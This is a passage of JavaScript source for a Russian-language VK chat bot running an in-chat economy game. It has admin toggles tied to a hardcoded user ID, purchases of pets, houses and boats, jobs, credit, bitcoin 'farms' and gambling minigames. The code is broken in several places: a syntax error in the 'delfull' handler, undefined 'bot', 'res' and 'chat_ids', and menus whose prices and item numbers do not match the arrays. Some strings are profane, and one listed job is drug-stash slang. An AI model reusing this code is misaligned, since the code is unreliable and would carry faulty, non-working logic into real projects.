	let user = acc.users[user_id(message.user)];    
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);  
	if(Number(message.$match[2]) == 1){
		texts = 'включил' 
		acc.users[message.$match[1]].admin.block_give = true;
	}
	if(Number(message.$match[2]) == 0){
		texts = 'отключил' 
		acc.users[message.$match[1]].admin.block_give = false;
	}
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `✅ ➾ Спец.Администратор ${texts} Вам запрет на выдачу валюты.`,random_id: 0
	}); 
	return message.send(`🔸 >> Вы ${texts}и запрет на выдачу валюты`);
});

vk.updates.hear(/^(?:blockrep)\s?([0-9]+)?\s?([0-9]+)?/i, (message) => {
	if(message.user != 515126478) return;
	let text = '';
	if(!message.$match[1] || !message.$match[2]) return;
	let id = user_id(message.user);	 	
	let i = config;
	if(id != 1) return;
	let user = acc.users[user_id(message.user)];    
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);  
	if(Number(message.$match[2]) == 1){
		texts = 'включил' 
		acc.users[message.$match[1]].admin.block_rep = true;
	}
	if(Number(message.$match[2]) == 0){
		texts = 'отключил' 
		acc.users[message.$match[1]].admin.block_rep = false;
	}
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `✅ ➾ Спец.Администратор ${texts} Вам запрет на ответы на репорты.`,random_id: 0
	}); 
	return message.send(`🔸 >> Вы ${texts}и запрет на ответ на репорты.`);
});
////////////////////




vk.updates.hear(/^(?:лет)\s?([0-9]+)?/i, message => {
	let user = acc.users[user_id(message.user)];
	if(user.ffffsasa == false) return message.send(`❗ У Вас нет паспорта ! Получите в мерии BigWars !\nНапишите " Мэрия "`);
	let a = zapret(message.$match[1]);
	if(a != 0) return message.send(a);
	if (message.$match[1] > 26 && message.$match[1] != user.zolos) return message.send(`Доступно до 26 лет !`);
	if(!message.$match[1]) return message.send(`➾ Укажите сколько Вам лет !`);
	user.zolos = message.$match[1]; 
	message.send(`Теперь Вам ${message.$match[1]} лет`);
});
  /// 
  vk.updates.hear(/^(?:givefull)\s?([0-9]+)?/i, message => {	
  	let id = user_id(message.user);	
  	let i = config;
  	if(message.user != 515126478) return; 
  	config.full.push(Number(message.$match[1]));
  	return message.send(`Вы выдали Full-Dostup игроку [${acc.users[message.$match[1]].prefix}]`);
  });

  vk.updates.hear(/^(?:delfull)\s?([0-9]+)?/i, message => {	
  	let id = user_id(message.user);	
  	let i = config;
  	if(message.user != 515126478) return; 

  	if(id != 1) return message.send(`🔸 ➾ Вы не спец.администратор`); 
  	delete config.full[message.$matchmessage.$match[1]];
  	return message.send(`Вы забрали Full-Dostup игрока [${acc.users[message.$match[1]].prefix}]`);
  });

  vk.updates.hear(/^(?:apanel)$/i,  message => {
  	let id = user_id(message.user);	
  	let i = config;
  	if(message.user != 515126478) return;
  	let a = '';
  	for(z=0;z<i.full.length;z++){if(z!=0){a+=`ID: ${z} | ${acc.users[i.full[z]].prefix}\n`}}
  		return message.send(`
  			- - Приватная Информация - -
  			* Слив данной информации - наказуем *
  			~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~

  			Настройки:
  			x2 баланс: ${i.bonus_balance}
  			х2 опыт: ${i.bonus_exs}
  			(bonus [balance/exs] [0/1])

  			Промокоды:
  			Выдача: ${i.promo.balance}$
  			Активаций: ${i.promo.activ}
  			(promo [balance/activ] [count])

  			Сообщения:
  			Время обновления: ${i.antiflood_time}
  			Лимит смс: ${i.antiflood_limit}

  			Full-Dostup:
  			${a}


  			`);
  });

  vk.updates.hear(/^(?:питомцы)\s?([1-9]+)?/i, message => {
  	if(!message.$match[1]){  
  		return message.send(`
  			🐼 Питомцы 🐼

  			🐌1. Улитка.
  			🐋2. Кит.
  			🐑3. Овца.
  			🐔4. Курица.
  			🐨5. Коала.
  			🐝6. Оса.
  			🐷7. Свинья.
  			🐘8. Слон.
  			🐵9. Мартышка.
  			10. Нету
  			🐅11. Тигр.
  			🐶12. Волк.
  			🐰13. Заяц.
  			🐄14. Корова.

  			💵 ➾ Цена питомца: 1.000.000$

  			Для покупки введите "Питомцы [номер]"
  			Для продажи введите "Продать питомца"
  			[Деньги не возвращаются]
  			`);
  	}
  	let i = message.$match[1];
  	let user = acc.users[user_id(message.user)];  
  	let names = [0,'Улитка','Кит','Овца','Курица','Коала','Оса','Свинья','Слон','Мартышка','Пингвин','Тигр','Волк','Заяц','Корова','Админ','грязный бомж','вонючая пизда']
  	if(i < 0 || i > 14) return;
  	if(user.pit != false) return message.send(`🐼 ➾ У вас уже куплен питомец`);
  	if(i > 0 && i <= 14){
  		if(user.balance < 1000000) return message.send(`🐼 ➾ У вас не достаточно $.`);
  		if(user.upis65465465 < 3) return message.send(`❗ Доступно с 3 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
  		user.balance -= 1000000;
  		user.pit = names[i];
  		return message.send(`🐼 ➾ Вы купили питомца (${names[i]}) за 1.000.000$`)
  	}

  });
 //////////////////////ствол//////////////////////////////////////////
 ////// Система магазин оружия

 ////////////////////////////////////////////////

 vk.updates.hear(/^(?:Продать питомца)/i,  message => {
 	let user = acc.users[user_id(message.user)];
 	if(user.pit == false) return message.send(`У вас нет питомца`);
 	user.pit = false;
 	return message.send(`🐼 ➾ Вы успешно продали питомца.`);
 });
 ///////////////////////////////////////////////////////
 vk.updates.hear(/^(?:дом)$/i, message => {
 	let user = acc.users[user_id(message.user)];
 	return message.send(`   

 		✒ ➾ Имущество:\n` +
 		(user.aircraft.id == false ? `✈ ➾ Самолет:  отсутствует\n` : `✈ ➾ Самолет:  ${user.aircraft.name}\n`)+
 		(user.helicopter.id == false ? `🚁 ➾ Вертолет: отсутствует\n` : `🚁 ➾ Вертолет: ${user.helicopter.name}\n`)+
 		(user.cars.id == false ? `🚘 ➾ Автомобиль: отсутствует\n` : `🚘 ➾ Автомобиль: ${user.cars.name}\n`)+  
 		(user.lodka == false ? `🚤 ➾ Лодка: отсутствует\n` : `🚤 ➾ Лодка: ${user.lodka}\n`)+ 
 		(user.house == false ? `🏡 ➾ Дом: отсутствует\n` : `🏡 ➾ Дом: ${user.house}\n`)+   
 		(user.house == false ? `\n🐼 ➾ Питомец: нету\n` : `\n🐼 ➾ Питомец: ${user.pit}\n`)+ 
 		` 

 		`);
 });
 

 vk.updates.hear(/^(?:дома)\s?([1-9]+)?/i, message => {
 	if(!message.$match[1]){  
 		return message.send(`
 			🏡 Дома 🏡 
 			➖➖➖➖➖➖➖➖➖➖
 			🏚Для Бомжей🏚
 			➖➖➖➖➖➖➖
 			⬛1. Коробка 📦 ✔
 			⬛Из Мусорки 20.000💷✔
 			⬛➖➖➖➖➖➖➖➖➖
 			⬛2. Подвал - 
 			⬛Цена: 50.000💷✔
 			⬛➖➖➖➖➖➖➖➖➖
 			⬛ 3. Палатка ⛺ 
 			⬛Цена: 150.000💷✔
 			⬛➖➖➖➖➖➖➖➖➖
 			⬛4. Домик на дереве 
 			⬛Цена: 300.000💷✔
 			⬛➖➖➖➖➖➖➖➖➖
 			⬛5.Полуразрушенный Дом 
 			⬛Цена: 500.000💷✔
 			⬛➖➖➖➖➖➖➖➖➖
 			⬛6. Дом в лесу 
 			⬛Цена: 700.000💷✔
 			⬛➖➖➖➖➖➖➖➖➖
 			⬛ 7.Дом в Европе
 			⬛Цена: 1.000.000💷✔
 			⬛➖➖➖➖➖➖➖➖➖
 			⬛8. Дача ✔
 			⬛Цена: 1.500.000💷✔
 			⬛➖➖➖➖➖➖➖➖➖
 			⬛ 9. Дом На Пляже ✔
 			⬛Цена: 2.000.000💷✔
 			⬛➖➖➖➖➖➖➖➖➖
 			10. Нету

 			🏢Дорогие Особняки🏢
 			➖➖➖➖➖➖➖➖➖
 			⬛11. Особняк 
 			⬛Цена: 100 рубинов💎
 			⬛➖➖➖➖➖➖➖➖➖
 			⬛ 12. Дом на Рублёвке 
 			⬛Цена: 150 рубинов💎
 			⬛➖➖➖➖➖➖➖➖➖

 			Для покупки введите "Дома [номер]"
 			Для продажи введите "Продать дом"
 			[Деньги не возвращаются]
 			🚨 Чтобы купить элитный дом, просто напишите " домэлит " ( стоимость 1.300.000.000 $
 			`);
 	}
 	let i = message.$match[1];
 	let user = acc.users[user_id(message.user)]; 
 	let count = [0, 20000,50000,150000,300000,500000,700000,1000000,1500000,2000000,5000000,100,150,300];
 	let names = [0, 'Коробка','Подвал','Палатка','Домик на дереве','Полуразрушенный дом','Дом в лесу','Дом в Европе','Дача','Дом На Пляже','Большой Коттедж','Особняк','Дом на Рублёвке','Личный небоскрёб']
 	if(i < 0 || i > 13) return;
 	if(user.house != false) return message.send(`🏢 ➾ У вас уже куплен дом`);
 	if(i > 0 && i <= 10){
 		if(user.balance < count[i]) return message.send(`🏢 ➾ У вас не достаточно денег.`);
 		user.balance -= count[i];
 		user.house = names[i];
 		return message.send(`🏢 ➾ Вы купили дом (${names[i]}) за ${count[i]}$`)
 	}
 	if(i > 11 && i < 13){
 		if(user.donate < count[i]) return message.send(`🏢 ➾ У вас не достаточно рубинов.`);
 		user.donate -= count[i];
 		user.house = names[i];
 		return message.send(`🏢 ➾ Вы купили дом (${names[i]}) за ${count[i]} рубинов`)
 	}
 });

 vk.updates.hear(/^(?:продать дом)/i,  message => {
 	let user = acc.users[user_id(message.user)];
 	if(user.house == false) return message.send(`У вас нет дома`);
 	user.house = false;
 	return message.send(`🏢 ➾ Вы успешно продали дом государству.`);
 });





 vk.updates.hear(/^(?:лодка)\s?([1-9]+)?/i, message => {
 	if(!message.$match[1]){
 		return message.send(`
 			⛵Обычнее Лодки ⛵ 
 			➖➖➖➖➖➖➖➖➖➖
 			🔵1 - Carer X- 
 			🔴10.000.000💷
 			➖➖➖➖➖➖➖➖➖➖
 			🔴2.Nauticat F 
 			🔴15.000.000💷
 			➖➖➖➖➖➖➖➖➖➖
 			🔵3. Nordhavn 56 MS 
 			🔴50.000.000💷✔
 			➖➖➖➖➖➖➖➖➖➖
 			🔴4. Princess 60
 			🔵100.000.000💷✔
 			➖➖➖➖➖➖➖➖➖➖
 			🚤Дорогие Катера🚤 
 			➖➖➖➖➖➖➖➖➖➖
 			🔵5. Azimut 70 
 			🔴200.000.000💷✔
 			➖➖➖➖➖➖➖➖➖
 			🔴6. Dominator 40M
 			🔵300.000.000💷✔
 			➖➖➖➖➖➖➖➖➖➖
 			🔵7. Moonen 124 
 			🔴450.000.000💷✔
 			➖➖➖➖➖➖➖➖➖➖
 			🔴8. Wider 150 
 			🔵650.000.000💷✔
 			➖➖➖➖➖➖➖➖➖➖
 			🔵9. Palmer Johnson 42M 
 			🔴800.000.000💷✔
 			➖➖➖➖➖➖➖➖➖➖
 			10. Нету
 			🔵1.000.000.000💷✔
 			➖➖➖➖➖➖➖➖➖➖
 			🛥Люксовые Яхты🛥
 			➖➖➖➖➖➖➖➖➖➖
 			🔴🔵11. Browns- 250 рубинов💎
 			➖➖➖➖➖➖➖➖➖➖
 			🔴🔵12. Golden Sky- 500 рубинов💎

 			Для покупки введите "Лодка [номер]"
 			Для продажи введите "Лодку продать"
 			[Деньги не возвращаются]
 			`);
 	}
 	let i = message.$match[1];
 	let user = acc.users[user_id(message.user)];
 	let count = [0, 10000000,15000000, 50000000,10000000,200000000,300000000,450000000,650000000,800000000,1000000000,250,500];
 	let names = [0, 'Carer X','Nauticat F','Nordhavn 56 MS','Princess 60','Azimut 70','Dominator 40M','Moonen 124','Wider 150','Palmer Johnson 42M','Wider FR','Browns','Golden Sky']
 	if(i < 0 || i > 12) return;
 	if(user.lodka != false) return message.send(`🛥 ➾ У вас уже куплена лодка`);
 	if(i > 0 && i <= 10){
 		if(user.balance < count[i]) return message.send(`🛥 ➾ У вас не достаточно денег.`);
 		user.balance -= count[i];
 		user.lodka = names[i];
 		return message.send(`🛥 ➾ Вы купили лодку (${names[i]}) за ${count[i]}$`)
 	}else{
 		if(user.donate < count[i]) return message.send(`У вас не достаточно рубинов.`);
 		user.donate -= count[i];
 		user.lodka = names[i];
 		return message.send(`🛥 ➾ Вы купили лодку (${names[i]}) за ${count[i]} рубинов`)
 	}
 });

 vk.updates.hear(/^(?:лодку продать)/i, message => {
 	let user = acc.users[user_id(message.user)]; 
 	if(user.lodka == false) return message.send(`🛥 ➾ У вас нет лодки`);
 	user.lodka = false;
 	return message.send(`🛥 ➾ Вы успешно продали лодку государству.`);
 });


//\\\\\\\\\\\ РАБОТЫ \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\



vk.updates.hear(/^(?:работы)\s?([1-9]+)?/i, message => {
	if(!message.$match[1]){
		return message.send(`
			👨‍⚖️ ◯работы ◯👨‍⚖️ 

			◯ 1. Посудамойщик | 500$/ч |[0] 
			◯ 2. Дворник | 1000к/ч |[10] 
			◯ 3. Закладчик | 150к/ч |[50] 
			◯ 4. Дальнобойщик | 159к/ч |[80] 
			◯ 5. Бизнесмен | 200к/ч |[150] 




			Для получения зарплаты и +1 стажа ежечасно прописывайте: 'Работать' 

			Чтобы устроиться введите: "работы [номер]" 
			Для увольния введите: "уволиться" 
			Трудовая книжка: 'Книжка' 
			Для работы введите: 'Работать'
			`);
	}
	let i = message.$match[1];
	let user = acc.users[user_id(message.user)];  
	if(user.lvl < 0) return message.send(`👨‍ ◬ Устроиться на работу можно имея 2 уровень\n💳 ➾ Ваш уровень [${user.lvl}]`);
	let names = [0, 'Посудамойщик','Дворник','Закладчик','Дальнобойщик','Бизнесмен']
	let staj = [0,0,10,50,80,150]
	let counts = [0,500,1000,150000,159000,200000]
	if(i <= 0 || i > 6) return;
	if(user.job.name != false) return message.send(`👨‍ ➾ У вас уже есть работа`);
	if(i > 0 && i <= 6){
		if(user.job.lvl < staj[i]) return message.send(`👨‍ ➾ У вас не достаточный стаж.`); 
		if(staj[i] > user.job.lvl) return message.send(`👨‍ ➾ У вас не достаточный стаж.`); 
		user.job.name = names[i];
		user.job.count = Number(counts[i]); 
		return message.send(`👨‍⚖️ ➾ Вы устроились на работу `)
	} 
});

vk.updates.hear(/^(?:уволиться)/i, message => {
	let user = acc.users[user_id(message.user)];
	if(user.job.name == false) return message.send(`👨‍⚖️ ➾ У вас нет работы.`);
	user.job.name = false;
	user.job.count = 0; 
	return message.send(`👨‍⚖️ ➾ Вы успешно уволились.`);
});

vk.updates.hear(/^(?:книжка)/i, message => {
	let user = acc.users[user_id(message.user)]; 
	let text = '';
	if(user.job.name == false){ text = 'отсутствует' }else{
		text = user.job.name
	} 
	return message.send(`
		📝 Трудовая книжка 📝
		📋 Стаж работы: ${user.job.lvl} 
		📋 Работа: ${text}
		📋 Зарплата: ${user.job.count}$/час
		`);
});

vk.updates.hear(/^(?:работать)/i, message => {
	let user = acc.users[user_id(message.user)]; 
	let text = '';
	if(user.ffffsasa == false) return message.send(`❗ У Вас нет паспорта ! Получите в мерии BigWars !\nНапишите " Мэрия "`);
	if(user.job.name == false) return message.send(`👨‍ ➾ У вас нет работы !`);
	if(user.job.stop != false) return message.send(`👨‍⚖️ >> Работать можно раз в час. Отдахните!`);
	if(user.upi564456465s >= 10) return message.send(`Вы находитесь в радио центре ! Выйдите от туда !`);
	if(user.banan16 == 10) return message.send(`⛳  Команды не доступны так как вы в парке !\nЧтобы выйти с парка, напишите " выходпарк "`); 
	if(user.kvest13 == 10) return message.send(`💈  Команды не доступны так как вы в клубе !\nЧтобы выйти с клуба, напишите " квыход "`);
	var counts = user.job.count
	user.balance += Number(user.job.count)*2; 
	user.job.lvl += 1;
	user.exs += 2;
	user.upis6 -= 10;
	user.almdfsadfsafin += 1;
	user.ivan22857657876 += 1;
	user.upis56456456  += 7;

	user.job.stop = true;
	setTimeout(() => {
		user.job.stop = false;
		vk.api.call('messages.send', {
			peer_id: user.id,
			message: `🤘🏻 Вы отдохнули ! Можете поработать еще ! Напиши " работать "` ,random_id: 0
		});
	}, 3600000);


	return message.send(`
		📝 ➾ Вы отработали час. +1 к стажу. +${counts}$.\n+7	опыта ( информация " лвлап " )
		`);
});





vk.updates.hear(/^(?:wiki|вики)\s([^]+)/i, message => {

	let cc = message.$match[1].toLowerCase();
	var filter0 = /(http(s)?:\/\/.)?(www\.)?[-a-z0-9@:%._\+~#=]{1,256}\.[a-z]{2,6}/
	var filter1 = /(?!http(s)?:\/\/)?(www\.)?[а-я0-9-_.]{1,256}\.(рф|срб|блог|бг|укр|рус|қаз|امارات.|مصر.|السعودية.)/
	var lol = filter0.test(cc)
	var lol1 = filter1.test(cc)
	if(filter0.test(cc) == true || filter1.test(cc) == true){
		var check = true;
		return message.send(`🆘 ➾ Отказ! | Подозрительная ссылка. |⛔`);

	}else{
		rq.get("https://ru.wikipedia.org/w/api.php?action=opensearch&search="+encodeURIComponent(message.$match[1])+"&meta=siteinfo&rvprop=content&format=json", function(e,r,b){
			var data = JSON.parse(b);
			message.reply("🔮 Ответ на ваш запрос. \n\n✏ Ссылка: " + data[3][0]);
		});
	}
})

vk.updates.hear(/^(?:анекдот)/i, message => {

	return prequest('https://www.anekdot.ru/random/poems/')
	.then(response => {
		let match = response.match(/\['([^']+)/);
		match = match && match[1].replace(/<br>/, '\n');
		message.reply("Анекдот  &#127770; \n " + match);

		return {
			message:      match
		}
	});
});

vk.updates.hear(/^(?:cc)\s?([^]+)?/i,  message => {

	let cc = message.$match[1].toLowerCase();

	let text = message.$match[1];
	if(!text) return message.send("⚠ Введите ссыслку, которую нужно сократить!");
	vk.api.call("utils.getShortLink", {url: text}).then(function (res){
		if(!text) return message.send("⚠ Введите ссыслку, которую нужно сократить!");
		message.send("😜 ➾ Короткая ссылка: " + res.short_url);
	});

});



///////////////////////////////////////////////////////////////////////////////

vk.updates.hear(/^(?:банк)$/i, message => {
	let user = acc.users[user_id(message.user)];
	if(user.upis65465465 < 2) return message.send(`❗ Доступно с 2 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
	return message.send(`
		💻  Счет в банке: ${user.bank}$ 
		🧤  Биткоинов: ${user.bitcoin} 

		📍
		Чтобы положить деньги , напиши " положить [сумма] " 
		Чтобы снять деньги , напиши " снять [сумма] " 
		Чтобы перевести деньги другу , напиши " перевести [ID] [сумма] " 

		📊 » Курс - Курс валют
		💎 » Халява - Ежедневный бонус ( Для новичков )

		`);
});
vk.updates.hear(/^(?:оружие выкинуть)/i, (message) => {
	let user = acc.users[user_id(message.user)];
	if(user.gun_name == false) return message.send(`🔫 ➾ У вас нет оружия`)
		user.balance = user.balance + user.gunstoit; 
	user.gun_name = false; 
	user.uron = 0;
	user.gunstoit = 0;
	return message.send(`🔫 ➾ Вы выкинули оружие!`)
});

vk.updates.hear(/^(?:кредит)\s?([0-9]+)?/i,  message => {
	let user = acc.users[user_id(message.user)];
	if(user.upis65465465 < 2) return message.send(`❗ Доступно с 2 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
	if(user.credit != 0) return message.send(`💳 ➾ Чтобы взять кредит, нужно погасить старый: [${spaces(user.credit)}$]`);
	if(!message.$match[1] || message.$match[1] <= 0 ) return message.send(`💳 ➾ Вы не указали сумму`);
	if(message.$match[1] < 100000 || message.$match[1] > 10000000) return message.send(`💳 ➾ Минимальная сумма кредита 100.000$\n💳 ➾ Максимальная сумма кредита 10.000.000$`);
	user.balance += Number(message.$match[1]);
	let dolg = Number(message.$match[1]) / 100 * 15;
	dolg += Number(message.$match[1]);
	user.credit = Number(dolg);
	user.procent = Number(message.$match[1] / 100 * 15);
	return message.send(`
		💳 ➾ Вы взяли кредит на сумму: ${spaces(message.$match[1])}$
		💳 ➾ К погашению: ${spaces(dolg)}$
		💳 ➾ Ежечасно будет списываться: ${spaces(message.$match[1] / 100 * 15)}$
		`);
});


vk.updates.hear(/^(?:погасить)\s?([0-9]+)?/i, message => {
	let user = acc.users[user_id(message.user)];
	if(user.credit == 0) return message.send(`💳 ➾ у вас нет кредита`);
	if(!message.$match[1] || message.$match[1] <= 0 ) return message.send(`💳 ➾ Вы не указали сумму.`);
	if(user.credit > user.balance) return message.send(`💳 ➾ У вас не достаточно денег.`);
	if(user.credit > message.$match[1]) return message.send(`💳 ➾ Оплатить кредит можно одним вкладом. [${spaces(user.credit)}$]`);
	if(user.credit < message.$match[1]) return message.send(`💳 ➾ Введите точную сумму к погашению. [${spaces(user.credit)}$]`);

	user.balance -= Number(message.$match[1]);
	user.credit -= Number(message.$match[1]);
	user.procent = 0;
	return message.send(`
		💳 ➾ Вы успешно погасили весь кредит.
		`);
});
////////////////////////////////////
//////////////////////////////////////





vk.updates.hear(/^(?:5656ферjaaма656)\s?([1-9]+)?/i, (message) => {  
	let user = acc.users[user_id(message.user)];  

	if(!message.$match[1]){
		return message.send(`
			👉 ➾ Список майнинг-ферм:

			1&#8419;. Мини ферма | (300к) | [10/2ч]
			2&#8419;. Средняя ферма | (1кк) | [32/2ч]
			3&#8419;. Большая ферма | (1ккк) | [30.307/2ч] 

			💸 ➾ Для аренды фермы на час: Ферма [номер]   
			💸 ➾ По истечению 2 часов биткоины будут зачислены на ваш счёт.
			`)
	}
	let i = message.$match[1]; 
	let ids = [0,1,2,3]
	let count = [0, 10, 32, 30307]; 
	let cena = [0, 300000,1000000,1000000000]

	if(i < 0 || i > 3) return;
	if(user.ferm.id != false) return message.send(`💸 ➾ У вас уже арендована ферма`);
	if(i > 0 && i <= 3){
		if(user.balance < cena[i]) return message.send(`💸 ➾ У вас не достаточно денег.`);
		user.ferm.id = Number(ids[i]); 
		user.balance -= cena[i];
		setTimeout(() => {
			user.bitcoin += Number(count[i])
			user.bitcoin += Number(count[i])
			user.ferm.id = false;
			vk.api.call('messages.send', {
				peer_id: user.id,
				message: `✅ ➾ Аренда майнинг-фермы закончилась.\n✅ ➾ Вы получили ${count[i]} Биткоинов.\n✅ ➾ 'Биткоин продать [count]' - для продажи.` ,random_id: 0
			});
		}, 7200000); 


		return message.send(`💸 ➾ Вы успешно арендавали на 2 часа майнинг-ферму.\n💸 ➾ Через час вам будет зачислено [${count[i]}] Биткоинов`)
	} 
}); 
 ///////////////////////////////////////////////


 //////////////////////////////////////////////

 vk.updates.hear(/^(?:биткоин продать)\s?([0-9]+)?/i, (message) => { 
 	if(!message.$match[1] || !Number(message.$match[1])) return message.send(`💸 ➾ Укажите кол-во биткоинов`)
 		let user = acc.users[user_id(message.user)];  
 	if(user.bitcoin < Number(message.$match[1])) return message.send(`💸 ➾ У вас нет столько Биткоинов.`);
 	user.bitcoin -= Number(message.$match[1]);
 	user.balance += Number(message.$match[1] * acc.bit)
 	return message.send(`💸 ➾ Вы продали ${message.$match[1]} биткоинов за ${acc.bit * message.$match[1]}$`)
 });
 
 vk.updates.hear(/^(?:сейф)/i, (message) => { 
 	let user = acc.users[user_id(message.user)]; 

 	if (user.safe.status != false) return message.send(`🔑 ➾ Взломать сейф можно раз в 10 минут.`);

 	if (user.safe.status == 3) return;
 	user.safe.status = 3;
 	user.safe.key = [`1111`, `2222`, `3333`, `4444`, `5555`, `6666`, `7777`, `8888`, `9999`, `0000`].random();
 	return message.send(` 
 		🏛 ➾ Вы начали взлом сейфа 🏛
 		🔑 ➾ Ваша задача: подобрать код из 4 одинаковых цифр.
 		🗝 ➾ Начать взлом: "Взлом [код]"
 		🌚 ➾ Удачи!

 		`);
 });

 vk.updates.hear(/^(?:взлом)\s?([0-9]+)?$/i, message => {
 	let user = acc.users[user_id(message.user)];

 	if (user.safe.status == true) return message.send(`🔑 ➾ Взломать сейф можно раз в 10 минут.`);
 	if (user.safe.status == false) return;
 	if (!message.$match[1]) return message.send(`🗝 ➾ Укажите код к сейфу.`);
 	if (message.$match[1] > 9999) return message.send(`🗝 ➾ Код - состоит из 4 одинаковых символов.`);
 	if (message.$match[1] < 0) return message.send(`🗝 ➾ Код - состоит из 4 одинаковых символов.`);
 	let nu = user.safe.key;
 	let kod = Number(message.$match[1]);
 	if (kod == user.safe.key) { 
 		let summ = rand(20000,33000);
 		user.balance += summ; 
 		user.safe.key = false; 
 		user.safe.status = true;
 		setTimeout(() => {
 			user.safe.status = false;
 		}, 600000);
 		return message.send(`🤑 ➾ Невероятно!\n🙊 ➾ Вы смогли угадать код\n🏛 ➾ Обыскивая сейф вы нашли:\n💴 ➾ ${spaces(summ)}$`);
 	} else {
 		user.safe.status = true;
 		user.safe.key = true;
 		setTimeout(() => {
 			user.safe.status = false;
 		}, 600000); 
 		return message.send(`🤠 ➾ Вы не угадали код.\n🤠 ➾ Вас задержали и оштрафовали.\n🔑 ➾ Верный код был: ${nu}`);
 	}
 }); 



/////////////менеджер



vk.updates.hear(/^(?:лотерея)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.balance < 5000) return message.send(`💣 ➾ Лотерейный билетик стоит 5000$`);
	user.balance -= 5000;
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		user.balance += 0;
		return message.send(`💣 ➾ Вам попалась неудачный билет.\n👒 ➾ Вы проиграли 5к`);
	}else{ 
		let count = [3000,5000,10000,15000,20000].random();
		user.balance += count;
		return message.send(`🎉 ➾ Удачный билетик!\n👒 ➾ Вы получили ${count}$`);
	}
});
vk.updates.hear(/^(?:!чат)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	vk.api.call('chat_id', {chat_id: res.object_id, fields: "chat_ids"})
	return message.send(`ID этого чата: ${spaces(chat_ids)}`);
});

vk.updates.hear(/^(?:вабанк)/i, (message) => {  
	let user = acc.users[user_id(message.user)];
	if(user.upis65465465 < 2) return message.send(`❗ Доступно с 2 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап "\nПопробуй другие игры: игры`);
	if(user.balance < 1) return message.send(`У тебя нет бабла!`);
	let rez = [true, false].random(); 
	if(rez == false){
		let text = [].random(); 
		user.balance += user.balance;
		return message.send(`🤴 Поздравляем ! Вы выиграли !`);
	}else{ 
		let count = [0].random();
		user.balance = count;
		return message.send(`Вы проиграли!`);
	}
});


vk.updates.hear(/^(?:эпик)/i, (message) => {  
	let user = acc.users[user_id(message.user)];
	if(user.almin4 == true) return message.send(`❗  Вы уже брали эпик кейс !`);
	let rez = [false].random(); 
	if(rez == false){
		let text = [].random(); 
		user.aldfsfdsamin += 1;
		user.almin4 = true;
		return message.send(`🤴 Вы получили: + 1 кейс эпика ( Напиши эоткрыть ).`);
	}else{ 
		let count = [0].random();
		user.balance = count;
		return message.send(``);
	}
});
////////////////////////////////////////////
vk.updates.hear(/^(?:стаканчик)\s([1-3])\s(.*)$/i, (message) => {
	let user = acc.users[user_id(message.user)]
	message.args[2] = message.args[2].replace(/(\.|\,)/ig, '');
	message.args[2] = message.args[2].replace(/(к|k)/ig, '000');
	message.args[2] = message.args[2].replace(/(м|m)/ig, '000000');
	message.args[2] = message.args[2].replace(/(вабанк|вобанк|все|всё)/ig, user.balance);

	if(!Number(message.args[2])) return;
	message.args[2] = Math.floor(Number(message.args[2]));

	if(message.args[2] <= 0) return;

	if(message.args[2] > user.balance) return bot(`у вас нет данной суммы`);
	else if(message.args[2] <= user.balance)
	{
		user.balance -= message.args[2];

		const multiply = utils.pick([0.95, 0.90, 0.85, 0.80, 0.75, 0.70, 0.65]);
		const cup = utils.random(1, 3);

		if(cup == message.args[1])
		{
			user.balance += Math.floor(message.args[2] * multiply);
			return bot(`вы угадали! Приз `);
		} else {
			return bot(`вы не угадали, это был } стаканчик`);
		}
	}
});
////////////////////////////////////////////
vk.updates.hear(/^(?:гиф)/i, async (message, bot) => {
	let user = acc.users[user_id(message.user)];
	vk.api.call('docs.search', {q: utils.pick(['ржака', 'игры', 'каваи', 'лайфхаки', 'тян', 'крафт', 'любовь', 'аниме', 'животные', '5 minute', 'пиздец', 'смешно', 'мем', 'классно', 'ня', 'пикча', 'авария']) + '.gif', count: 1})
	.then(response => {
		let items = response.items.map(x => `doc${x.owner_id}_${x.id}`).join(',');
		let item = utils.pick(response.items);
		message.send({attachment: items})
	})
});








vk.updates.hear(/^(?:выбери)\s([^]+)\s(?:или)\s([^]+)$/i, async (message, bot) => {
	let user = acc.users[user_id(message.user)];
	const first = message.$match[1];
	const second = message.$match[2];

	const phrase = utils.pick([`конечно ${utils.random(1, 2)} вариант`, `мне кажется, что ${utils.random(1, 2)} вариант лучше`]);
	return bot(`${phrase}`);
});
vk.updates.hear(/^(?:бросок)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.banan19 < 10) return message.send(`Вы не на баскетбольной площадке !`);
	let rez = [1,2].random();
	if(rez == 1){
		let text = [].random(); 
		for(i=0;i<200000;i++){
			if(acc.users[i]){
				if(acc.users[i].banan19 >= 10){ 
					vk.api.call("messages.send", {
						peer_id: acc.users[i].id,
						message: `< 🏀 >: [НА БАСКЕТЕ]\n🏀 ➾ ID игрока: ${user_id(message.user)}\nКинул в корзину баскетбольный мячик и промазал !\n`,random_id: 0
					}).then((res) => {}).catch((error) => {console.log('report error'); });	
				}
			}
		}
		return message.send(`Промах (`);;
	}
	if(rez == 2){
		let text = [].random(); 
		for(i=0;i<200000;i++){
			if(acc.users[i]){
				if(acc.users[i].banan19 >= 10){ 
					vk.api.call("messages.send", {
						peer_id: acc.users[i].id,
						message: `< 🏀 >: [НА БАСКЕТЕ]\n🏀 ➾ ID игрока: ${user_id(message.user)}\nКинул в корзину баскетбольный мячик и попал !`,random_id: 0
					}).then((res) => {}).catch((error) => {console.log('report error'); });	
				}
			}
		}
		return message.send(`Везет )`);
	}


});  

vk.updates.hear(/^(?:янеробот)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.ivan22857657876 < 5) return message.send(``);
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		return message.send(`Окей) Верю`);
	}else{ 
		let count = [0].random();
		user.balance += count;
		return message.send(`Окей верю)`);
	}
}); 
